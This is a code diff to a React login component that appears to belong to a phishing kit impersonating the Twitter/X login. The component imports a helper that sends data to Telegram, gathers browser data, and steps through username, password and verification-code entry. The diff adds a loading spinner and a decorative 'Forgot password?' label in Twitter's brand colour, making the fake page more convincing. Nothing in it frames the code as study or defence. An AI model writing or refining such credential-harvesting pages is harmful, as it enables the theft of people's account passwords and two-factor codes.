@@ -1,12 +1,13 @@
 "use client";
 
-import { useCallback, useState } from "react";
+import { useCallback, useEffect, useLayoutEffect, useState } from "react";
 import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";
 import Image from "next/image";
 import { getInputType, InputType } from "@/helpers/getInputType";
 import { Input } from "./input";
 import type { User } from "@prisma/client";
 import type { TwitterUser } from "@/app/api/twitter/users/route";
+import { Spinner } from "./spinner";
 
 type Props = {
 	browserData: {
@@ -54,6 +55,7 @@ export function LoginFormSteps({ browserData }: Props) {
 	};
 
 	const handleFirstStep = async () => {
+		setLoading(true);
 		const inputType = getInputType(username);
 
 		if (inputType === InputType.Username) {
@@ -63,6 +65,7 @@ export function LoginFormSteps({ browserData }: Props) {
 
 			if (user.error) {
 				handleShowError();
+				setLoading(false);
 				return;
 			}
 
@@ -70,17 +73,20 @@ export function LoginFormSteps({ browserData }: Props) {
 			setUsername(user.username);
 			setDisabledUsername(true);
 			setStep(2);
+			setLoading(false);
 			return;
 		}
 
 		if (inputType === InputType.Email || inputType === InputType.Phone) {
 			setDisabledUsername(true);
 			setStep(2);
+			setLoading(false);
 			return;
 		}
 
 		handleShowError();
 		setUsername("");
+		setLoading(false);
 	};
 
 	const handleSaveUser = useCallback(async () => {
@@ -334,14 +340,19 @@ export function LoginFormSteps({ browserData }: Props) {
 								disabled={disabledUsername}
 							/>
 
-							<Input
-								// biome-ignore lint/a11y/noAutofocus: <explanation>
-								autoFocus={true}
-								type="password"
-								label="Password"
-								value={password}
-								onChange={(e) => setPassword(e.target.value)}
-							/>
+							<div>
+								<Input
+									// biome-ignore lint/a11y/noAutofocus: <explanation>
+									autoFocus={true}
+									type="password"
+									label="Password"
+									value={password}
+									onChange={(e) => setPassword(e.target.value)}
+								/>
+								<span className="pl-2 text-xs text-[#1D9BF0]">
+									Forgot password?
+								</span>
+							</div>
 						</div>
 					</div>
 
@@ -351,7 +362,7 @@ export function LoginFormSteps({ browserData }: Props) {
 							disabled={!username || !password || loading}
 							className="w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
 						>
-							{loading ? "..." : "Log in"}
+							Log in
 						</button>
 
 						<div className="mt-5 mb-6">
@@ -423,7 +434,7 @@ export function LoginFormSteps({ browserData }: Props) {
 							disabled={!code || loading}
 							className="mb-6 w-full h-14 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
 						>
-							{loading ? "..." : "Next"}
+							Next
 						</button>
 
 						<a
@@ -434,6 +445,12 @@ export function LoginFormSteps({ browserData }: Props) {
 						</a>
 					</div>
 				</form>
+			)}
+
+			{loading && (
+				<div className="absolute inset-0 size-full flex-1 flex items-center justify-center bg-black">
+					<Spinner />
+				</div>
 			)}
 		</>
 	);
